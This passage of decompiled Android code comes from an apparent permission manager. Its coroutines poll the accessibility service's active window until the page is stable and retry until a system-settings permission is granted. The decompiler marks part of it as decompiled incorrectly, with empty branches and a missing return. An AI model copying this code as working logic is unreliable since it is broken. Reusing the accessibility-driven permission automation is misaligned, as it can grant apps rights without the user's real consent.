            writeSettingsPermissionManager$waitForPageStable$12 = writeSettingsPermissionManager$waitForPageStable$1;
            c0327b22 = c0327b2;
            jCurrentTimeMillis = System.currentTimeMillis();
            i2 = 0;
            j4 = j;
            i3 = -1;
            i4 = i;
        } else {
            if (i6 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i7 = writeSettingsPermissionManager$waitForPageStable$1.f53011a3;
            int i8 = writeSettingsPermissionManager$waitForPageStable$1.f53010a2;
            long j5 = writeSettingsPermissionManager$waitForPageStable$1.f53014a6;
            long j6 = writeSettingsPermissionManager$waitForPageStable$1.f53013a5;
            long j7 = writeSettingsPermissionManager$waitForPageStable$1.f53012a4;
            int i9 = writeSettingsPermissionManager$waitForPageStable$1.f53009a1;
            c0327b22 = writeSettingsPermissionManager$waitForPageStable$1.f53008a0;
            kg1.m213544f4(obj);
            i4 = i9;
            writeSettingsPermissionManager$waitForPageStable$12 = writeSettingsPermissionManager$waitForPageStable$1;
            i3 = i8;
            i2 = i7;
            jCurrentTimeMillis = j5;
            j3 = j6;
            j4 = j7;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j3) {
            AccessibilityNodeInfo rootInActiveWindow = c0327b22.f53166a0.getRootInActiveWindow();
            int iM211695a9 = rootInActiveWindow != null ? m211695a9(rootInActiveWindow) : 0;
            m211711f4(rootInActiveWindow);
            if (iM211695a9 != i3 || iM211695a9 <= 0) {
                i3 = iM211695a9;
                i2 = 0;
            } else {
                i2++;
                if (i2 >= i4) {
                    return Boolean.TRUE;
                }
            }
            writeSettingsPermissionManager$waitForPageStable$12.f53008a0 = c0327b22;
            writeSettingsPermissionManager$waitForPageStable$12.f53009a1 = i4;
            writeSettingsPermissionManager$waitForPageStable$12.f53012a4 = j4;
            writeSettingsPermissionManager$waitForPageStable$12.f53013a5 = j3;
            writeSettingsPermissionManager$waitForPageStable$12.f53014a6 = jCurrentTimeMillis;
            writeSettingsPermissionManager$waitForPageStable$12.f53010a2 = i3;
            writeSettingsPermissionManager$waitForPageStable$12.f53011a3 = i2;
            writeSettingsPermissionManager$waitForPageStable$12.f53017a9 = 1;
            if (b81.m210571b1(j4, writeSettingsPermissionManager$waitForPageStable$12) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.FALSE;
    }

    /* JADX WARN: Removed duplicated region for block: B:16:0x0044  */
    /* JADX WARN: Removed duplicated region for block: B:25:0x0062  */
    /* JADX WARN: Removed duplicated region for block: B:27:0x0068  */
    /* JADX WARN: Removed duplicated region for block: B:28:0x006a  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x0059 -> B:23:0x005c). Please report as a decompilation issue!!! */
    /* renamed from: g2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211755g2(int i, long j, ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$waitForPermissionGranted$1 writeSettingsPermissionManager$waitForPermissionGranted$1;
        int i2;
        int i3;
        long j2;
        C0327b2 c0327b2;
        if (continuationImpl instanceof WriteSettingsPermissionManager$waitForPermissionGranted$1) {
            writeSettingsPermissionManager$waitForPermissionGranted$1 = (WriteSettingsPermissionManager$waitForPermissionGranted$1) continuationImpl;
            int i4 = writeSettingsPermissionManager$waitForPermissionGranted$1.f53024a6;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$waitForPermissionGranted$1.f53024a6 = i4 - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$waitForPermissionGranted$1 = new WriteSettingsPermissionManager$waitForPermissionGranted$1(this, continuationImpl);
            }
        }
        Object obj = writeSettingsPermissionManager$waitForPermissionGranted$1.f53022a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = writeSettingsPermissionManager$waitForPermissionGranted$1.f53024a6;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            i2 = i;
            i3 = 0;
            j2 = j;
            c0327b2 = this;
            if (i3 >= i2) {
            }
        } else {
            if (i5 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i3 = writeSettingsPermissionManager$waitForPermissionGranted$1.f53020a2;
            long j3 = writeSettingsPermissionManager$waitForPermissionGranted$1.f53021a3;
            int i6 = writeSettingsPermissionManager$waitForPermissionGranted$1.f53019a1;
            c0327b2 = writeSettingsPermissionManager$waitForPermissionGranted$1.f53018a0;
            kg1.m213544f4(obj);
            j2 = j3;
            i2 = i6;
            if (!c0327b2.m211734d5()) {
                c0327b2.m211741e6();
                return Boolean.TRUE;
            }
            i3++;
            if (i3 >= i2) {
                return Boolean.FALSE;
            }
            if (!c0327b2.f53169a3) {
                return Boolean.FALSE;
            }
            writeSettingsPermissionManager$waitForPermissionGranted$1.f53018a0 = c0327b2;
            writeSettingsPermissionManager$waitForPermissionGranted$1.f53019a1 = i2;
            writeSettingsPermissionManager$waitForPermissionGranted$1.f53021a3 = j2;
            writeSettingsPermissionManager$waitForPermissionGranted$1.f53020a2 = i3;
            writeSettingsPermissionManager$waitForPermissionGranted$1.f53024a6 = 1;
            if (b81.m210571b1(j2, writeSettingsPermissionManager$waitForPermissionGranted$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            if (!c0327b2.m211734d5()) {
            }
        }
    }
}
